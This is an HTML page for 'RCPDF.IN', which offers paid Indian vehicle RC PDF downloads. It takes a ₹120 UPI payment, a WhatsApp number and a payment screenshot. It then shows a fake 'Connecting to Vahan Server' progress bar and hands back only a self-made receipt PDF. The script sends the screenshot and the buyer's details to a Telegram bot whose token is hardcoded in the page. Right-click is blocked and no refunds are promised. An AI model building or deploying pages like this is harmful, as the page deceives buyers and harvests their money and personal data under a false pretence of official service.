<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Fast RC Download</title>
    <meta name="description" content="Download Vehicle RC PDF online at RCPDF.IN. Official Format Support.">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    
    <style>
        :root { --primary: #ff0066; --blue-ind: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0f0f12; color: #fff; overflow-x: hidden; }

        /* Header */
        .topbar {
            position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px;
            display: flex; justify-content: space-between; align-items: center; z-index: 1000;
        }
        .menu-icon { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
        .menu-icon div { width: 25px; height: 3px; background: var(--primary); }
        .home-btn { background: var(--primary); color: #fff; border: none; padding: 5px 12px; border-radius: 5px; cursor: pointer; }

        /* Sidebar */
        .sidebar {
            position: fixed; top: 0; left: -280px; width: 260px; height: 100%;
            background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; color: #333;
        }
        .sidebar.active { left: 0; }
        .side-link { display: block; width: 100%; padding: 12px; margin-bottom: 10px; background: #f0f0f0; 
                     color: #333; text-decoration: none; border-radius: 8px; font-weight: bold; text-align: center; border: none; cursor: pointer;}

        /* IND Number Plate Style Input */
        .ind-plate {
            background: #fff; width: 100%; max-width: 320px; margin: 20px auto;
            border: 2px solid #333; border-radius: 8px; display: flex; align-items: center;
            overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
        .ind-side {
            background: var(--blue-ind); width: 35px; height: 55px; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; font-size: 10px;
        }
        .ind-side img { width: 20px; margin-bottom: 2px; }
        #vehInput {
            flex: 1; border: none; height: 55px; font-size: 26px; font-weight: 900;
            text-align: center; letter-spacing: 2px; color: #000; outline: none; text-transform: uppercase;
        }

        /* Main Card */
        .main-card {
            margin: 100px auto 20px; width: 92%; max-width: 400px;
            background: rgba(255,255,255,0.1); backdrop-filter: blur(10px);
            padding: 25px; border-radius: 20px; text-align: center;
        }

        .action-btn {
            width: 100%; padding: 16px; border-radius: 12px; border: none;
            background: var(--primary); color: #fff; font-size: 16px; font-weight: bold;
            box-shadow: 0 5px 0 #b30047; cursor: pointer;
        }

        .qr-box { background: #fff; padding: 10px; border-radius: 12px; margin: 15px 0; display: inline-block; }
        .qr-box img { width: 180px; }

        /* Loader */
        .loader-screen {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000;
            display: none; flex-direction: column; justify-content: center; align-items: center;
        }
        .progress-bar { width: 75%; height: 12px; background: #222; border-radius: 10px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: 0.1s; }

        /* Success Popup */
        .success-popup {
            position: fixed; inset: 0; background: var(--primary); z-index: 6000;
            display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;
        }

        .footer { margin: 20px 0; font-size: 12px; opacity: 0.6; text-align: center; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="topbar">
        <div class="menu-icon" onclick="toggleMenu()">
            <div></div><div></div><div></div>
        </div>
        <div style="color:var(--primary); font-weight:bold; font-size:20px;">RCPDF.IN</div>
        <button class="home-btn" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="sidebar">
        <h3 style="margin-bottom:20px;">Menu</h3>
        <button class="side-link" onclick="alert('RCPDF.IN provides instant RC Receipts and Digital copies.')">About Us</button>
        <button class="side-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'">Insurance</button>
        <button class="side-link" onclick="alert('Terms: No refund after payment. This is for info purpose only.')">Terms & Conditions</button>
        <button class="side-link" onclick="alert('Disclaimer: We are not affiliated with RTO/Government.')">Disclaimer</button>
        <button class="side-link" onclick="showHistory()">My History</button>
        <div id="history-list" style="margin-top:10px; font-size:11px;"></div>
        <button class="side-link" style="background:#333; color:#fff; margin-top:20px;" onclick="toggleMenu()">Close</button>
    </div>

    <div class="main-card">
        <div id="page1">
            <h2 style="margin-bottom:10px;">Download RC</h2>
            <div class="ind-plate">
                <div class="ind-side">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
                    <span>IND</span>
                </div>
                <input type="text" id="vehInput" placeholder="BR 09 AB 1234" maxlength="13" oninput="formatVehicle(this)">
            </div>
            <button class="action-btn" onclick="showPage2()">Continue</button>
        </div>

        <div id="page2" style="display:none;">
            <button class="action-btn" style="background:#000;" onclick="payNow()">Pay ₹120 with ANY UPI</button>
            <div class="qr-box">
                <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC-Download">
            </div>
            <input type="tel" id="mobInput" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px;">
            <input type="file" id="ssInput" accept="image/*" style="margin-bottom:15px;">
            <button class="action-btn" onclick="startProcess()">Verify & Download</button>
        </div>
    </div>

    <div class="footer">© Copyright Reserved 2026 Apex Solution</div>

    <div class="loader-screen" id="loader">
        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
        <div id="percentText" style="font-size:30px; font-weight:bold; margin-top:10px;">0%</div>
        <p>Connecting to Vahan Server...</p>
    </div>

    <div class="success-popup" id="successPopup">
        <h1 style="font-size:60px;">✅</h1>
        <h2>Submitted Successfully!</h2>
        <p style="margin:20px 0;">Receipt has been downloaded. PDF will be sent on WhatsApp.</p>
        <button class="action-btn" style="background:#fff; color:var(--primary); width:200px;" onclick="location.reload()">Home</button>
    </div>

    <script>
        function formatVehicle(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += " " + v.substring(2, 4);
            if (v.length > 4) out += " " + v.substring(4, 6);
            if (v.length > 6) out += " " + v.substring(6, 10);
            i.value = out;
        }

        function toggleMenu() { document.getElementById('sidebar').classList.toggle('active'); }

        function showPage2() {
            if(document.getElementById('vehInput').value.length < 8) { alert("Invalid Vehicle Number"); return; }
            document.getElementById('page1').style.display='none';
            document.getElementById('page2').style.display='block';
        }

        function payNow() {
            window.location.href = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC-Download";
        }

        function downloadPDF(v, m) {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const txn = "TXN" + Math.floor(Math.random() * 999999);

            // Red Box Design
            doc.setDrawColor(255, 0, 102); doc.setLineWidth(1.5); doc.rect(5, 5, 200, 287);
            doc.setFillColor(255, 0, 102); doc.rect(5, 5, 200, 20, 'F');
            doc.setTextColor(255, 255, 255); doc.setFontSize(20); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 18, null, null, "center");

            doc.setTextColor(0, 0, 0); doc.setFontSize(12);
            const drawRow = (y, l, val) => {
                doc.setFillColor(245, 245, 245); doc.rect(15, y, 60, 10, 'F');
                doc.rect(15, y, 60, 10); doc.rect(75, y, 115, 10);
                doc.text(l, 18, y+7); doc.text(val, 78, y+7);
            }

            drawRow(40, "Vehicle Number", v);
            drawRow(55, "Mobile Number", m);
            drawRow(70, "Transaction ID", txn);
            drawRow(85, "Amount Paid", "INR 120.00");
            drawRow(100, "Date", new Date().toLocaleDateString());

            // Terms & Conditions
            doc.setFontSize(10); doc.setFont("helvetica", "bold");
            doc.text("Terms and Conditions:", 15, 130);
            doc.setFont("helvetica", "normal");
            let terms = [
                "• Yeh website kisi bhi RTO ya sarkari vibhag se nahi judi hai.",
                "• Payment ke baad kisi bhi sthiti mein refund nahi diya jayega.",
                "• Hum sirf data provide karne ki suvidha dete hain, authenticity ki guarantee nahi.",
                "• PDF deliver hone mein 30-60 minute ka samay lag sakta hai.",
                "• Galat vehicle number dalne par payment bekar jayegi.",
                "• Privacy: Aapka data hamare servers par safe hai.",
                "• Disclaimer: Is PDF ka use sirf information purpose ke liye karein."
            ];
            doc.text(terms, 15, 140);

            doc.save(`Receipt_${v}.pdf`);
        }

        function saveToHistory(v) {
            let h = JSON.parse(localStorage.getItem('h') || "[]");
            h.push(v); localStorage.setItem('h', JSON.stringify(h));
        }

        function showHistory() {
            let h = JSON.parse(localStorage.getItem('h') || "[]");
            document.getElementById('history-list').innerHTML = h.map(i => `<div>🚗 ${i}</div>`).join('');
        }

        async function startProcess() {
            const v = document.getElementById('vehInput').value;
            const m = document.getElementById('mobInput').value;
            const f = document.getElementById('ssInput').files[0];
            if(m.length < 10 || !f) { alert("Missing Details"); return; }

            document.getElementById('loader').style.display='flex';
            let p = 0;
            let itv = setInterval(() => {
                p += 5; document.getElementById('fill').style.width = p+'%'; document.getElementById('percentText').innerText = p+'%';
                if(p >= 100) {
                    clearInterval(itv);
                    downloadPDF(v, m);
                    saveToHistory(v);
                    let fd = new FormData(); fd.append("chat_id", "5600045707"); fd.append("photo", f);
                    fd.append("caption", `New Order\nVeh: ${v}\nMob: ${m}`);
                    fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd});
                    document.getElementById('loader').style.display='none';
                    document.getElementById('successPopup').style.display='flex';
                }
            }, 100);
        }
    </script>
</body>
</html>
